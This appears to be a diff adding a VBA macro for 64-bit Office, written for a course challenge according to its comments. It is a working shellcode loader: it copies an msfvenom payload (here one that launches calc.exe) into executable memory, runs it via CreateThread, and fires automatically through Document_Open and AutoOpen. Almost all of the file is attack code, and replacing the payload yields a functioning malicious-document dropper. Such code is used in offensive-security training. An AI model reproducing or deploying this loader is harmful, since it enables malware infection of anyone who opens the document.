@@ -1,0 +1,98 @@
+' I wrote this to complete a challenge in a course. ChatGPT helped.
+' There's a bunch of stuff in here that's not needed. I might edit later. Maybe not. Who knows
+' This should work on 64bit Office apps like Word
+' If you're generating shellcode make sure it's 64bit!
+#If VBA7 Then
+    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+        ByVal lpAddress As LongPtr, _
+        ByVal dwSize As LongPtr, _
+        ByVal flAllocationType As LongPtr, _
+        ByVal flProtect As LongPtr) As LongPtr
+
+    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+        ByVal lpThreadAttributes As LongPtr, _
+        ByVal dwStackSize As LongPtr, _
+        ByVal lpStartAddress As LongPtr, _
+        ByVal lpParameter As LongPtr, _
+        ByVal dwCreationFlags As Long, _
+        ByRef lpThreadId As LongPtr) As LongPtr
+
+    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
+        ByVal Destination As LongPtr, _
+        ByVal Source As LongPtr, _
+        ByVal Length As LongPtr)
+
+#Else
+    Private Declare Function VirtualAlloc Lib "kernel32" ( _
+        ByVal lpAddress As Long, _
+        ByVal dwSize As Long, _
+        ByVal flAllocationType As Long, _
+        ByVal flProtect As Long) As Long
+
+    Private Declare Function CreateThread Lib "kernel32" ( _
+        ByVal lpThreadAttributes As Long, _
+        ByVal dwStackSize As Long, _
+        ByVal lpStartAddress As Long, _
+        ByVal lpParameter As Long, _
+        ByVal dwCreationFlags As Long, _
+        ByRef lpThreadId As Long) As Long
+
+    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
+        ByVal Destination As Long, _
+        ByVal Source As Long, _
+        ByVal Length As Long)
+
+#End If
+
+Private Const MEM_COMMIT As LongPtr = &H1000&
+Private Const PAGE_EXECUTE_READWRITE As LongPtr = &H40&
+Private Const INFINITE As Long = &HFFFFFFFF
+Sub RunShellcode()
+    Dim bytes() As Byte
+    
+    ' $ msfvenom -p windows/x64/exec CMD='calc.exe' -f vbapplication EXITFUNC=thread
+    buf = Array(252, 72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, _
+    139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, _
+    139, 66, 60, 72, 1, 208, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, _
+    139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, _
+    64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, _
+    236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, _
+    139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 65, 186, 166, 149, 189, 157, 255, 213, 72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, _
+    111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)
+    
+    ' Create a byte array out of the buffer
+    ReDim bytes(LBound(buf) To UBound(buf)) As Byte
+    For i = LBound(buf) To UBound(buf)
+        bytes(i) = buf(i)
+    Next i
+
+    ' Allocate memory
+    Dim pMemory As LongPtr
+    pMemory = VirtualAlloc(ByVal 0&, UBound(bytes) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    If pMemory = 0 Then
+        MsgBox "VirtualAlloc failed: " & Err.LastDllError
+        Exit Sub
+    End If
+
+    ' Copy the byte buffer into the newly allocated memory
+    ' MsgBox (Hex(pMemory)) ' Uncomment this if you want the memory address for debugging purposes
+    Call CopyMemory(ByVal pMemory, VarPtr(bytes(0)), UBound(bytes) + 1)
+
+    ' Create a new thread to execute the code in the memory buffer
+    Dim hThread As LongPtr
+    hThread = CreateThread(ByVal 0&, ByVal 0&, ByVal pMemory, ByVal 0&, 0&, ByVal 0&)
+    
+    'If hThread <> 0 Then
+    '    WaitForSingleObject hThread, INFINITE
+    '    CloseHandle hThread
+    'End If
+
+    ' Free the memory when we're done with it
+    'VirtualFree ByVal pMemory, 0&, &H8000&
+End Sub
+Sub Document_Open()
+    RunShellcode
+End Sub
+Sub AutoOpen()
+    RunShellcode
+End Sub
